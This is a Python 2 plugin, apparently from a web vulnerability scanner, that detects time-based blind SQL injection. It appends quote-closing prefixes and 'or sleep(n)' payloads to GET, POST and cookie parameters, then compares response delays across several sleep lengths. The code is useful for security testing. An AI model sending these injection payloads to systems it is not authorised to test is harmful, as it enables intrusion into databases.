import re
import time

import output
import conf.lunaconf
import lunaexp

luna_output = output.output()
luna_conf = conf.lunaconf.lunaconf()

class timebased_sqli(lunaexp.base):

    ruleid = 0x0202
    method = ['GET','POST','COOKIE']
    key_exp = ''
    value_exp = ''

    and_or = ['and','or']
    closure_prefix = [" ","' ","\" ",") ","') ","\") ","'\" ","\"' ","%' ","%\" "]
    closere_suffix_and = [""," "+and_or[0]+" 'a'='a"," "+and_or[0]+" \"a\"=\"a"," "+and_or[0]+" 1 in (1"," "+and_or[0]+" ('a')=('a"," "+and_or[0]+" (\"a=\")=(\"a"," "+and_or[0]+" \"'a'\"=\"'a"," "+and_or[0]+" '\"a\"'='\"a"," "+and_or[0]+" '%'='"," "+and_or[0]+" \"%\"=\""]
    closere_suffix_or = [""," "+and_or[1]+" 'a'='a"," "+and_or[1]+" \"a\"=\"a"," "+and_or[1]+" 1 in (1"," "+and_or[1]+" ('a')=('a"," "+and_or[1]+" (\"a=\")=(\"a"," "+and_or[1]+" \"'a'\"=\"'a"," "+and_or[1]+" '\"a\"'='\"a"," "+and_or[1]+" '%'='"," "+and_or[1]+" \"%\"=\""]
    closere_suffix_general = [" --"," #"," /*"]
    
    time_base_times = 1
    time_base_delaytime = 1
    time_base_exp_and = [""+and_or[0]+" sleep("+str(time_base_delaytime)+")"]
    time_base_exp_or = [""+and_or[1]+" sleep("+str(time_base_delaytime)+")"]

    timebased_weight = 1    # Turn up it when you meet the large network delay.
    #time_base_average = 0

    rule_type = "timebased_sqli"

    match_with = "sqli.time_based"

    content_type_whitelist = []


    options = 0xF1

    def __init__(self,sleep_time=1):
        self.time_base_times = sleep_time
        self.time_base_delaytime = sleep_time
        self.time_base_exp_and = [""+self.and_or[0]+" sleep("+str(self.time_base_delaytime)+")"]
        self.time_base_exp_or = [""+self.and_or[0]+" sleep("+str(self.time_base_delaytime)+")"]

        self.luna_output = output.output()                                                       #cmd out control
        self.luna_conf = conf.lunaconf.lunaconf()                                                #load conf
        self.set_option() 
    

    def scan_main(self,luna_scan,luna_report,scan_type,urlencode_type):  

        timebased_sqli_1 = timebased_sqli(1)
        timebased_sqli_3 = timebased_sqli(3)
        timebased_sqli_5 = timebased_sqli(5)
        timebased_sqli_7 = timebased_sqli(7)

        time_1 = False
        time_3 = False
        time_5 = False
        time_7 = False

        time_dif_1 = 0 
        time_dif_3 = 0 
        time_dif_5 = 0 
        time_dif_7 = 0 

        for i,c_p in enumerate(self.closure_prefix):
            time_dif_1,time_number_1=self.scan_1357(timebased_sqli_1,luna_scan,scan_type,urlencode_type,c_p,self.closere_suffix_or[i])
            if not time_dif_1 :
                continue
            time_dif_3,time_number_3=self.scan_1357(timebased_sqli_3,luna_scan,scan_type,urlencode_type,c_p,self.closere_suffix_or[i])
            if not time_dif_3 :
                continue
            time_dif_5,time_number_5=self.scan_1357(timebased_sqli_5,luna_scan,scan_type,urlencode_type,c_p,self.closere_suffix_or[i])
            if not time_dif_5 :
                continue
            time_dif_7,time_number_7=self.scan_1357(timebased_sqli_7,luna_scan,scan_type,urlencode_type,c_p,self.closere_suffix_or[i])
            if not time_dif_7 :
                continue


            print time_number_1
            print time_number_3
            print time_number_5
            print time_number_7
            new_time_1 = time_number_1 / 1.0 
            new_time_3 = time_number_3 / 3.0 
            new_time_5 = time_number_5 / 5.0 
            new_time_7 = time_number_7 / 7.0 

            avg = (new_time_1 + new_time_3 + new_time_5 + new_time_7) / 4.0
            variance = (new_time_1-avg) ** 2 + (new_time_3-avg) ** 2 + (new_time_5-avg) ** 2 + (new_time_7-avg) ** 2 
            if variance < self.timebased_weight :
                luna_output.vul_xss_output("[","time_based_sqli found:"+str(variance),"]")
                luna_report.report_http(luna_scan,self)

                return True


        return False


       
    def scan_1357(timebased_sqli, tb_s , luna_scan , scan_type, urlencode_type , c_p , c_s):
        tb_s.value_exp = c_p+tb_s.time_base_exp_or[0] + c_s
        print tb_s.value_exp
        a= time.time()
        status,header,data = luna_scan.scan_for_all(tb_s,0,scan_type,urlencode_type)
        b= time.time()
        time_number = b-a
        if time_number  > tb_s.time_base_delaytime:
            time_delay = True
            return time_delay,time_number
        else:
            return False,0

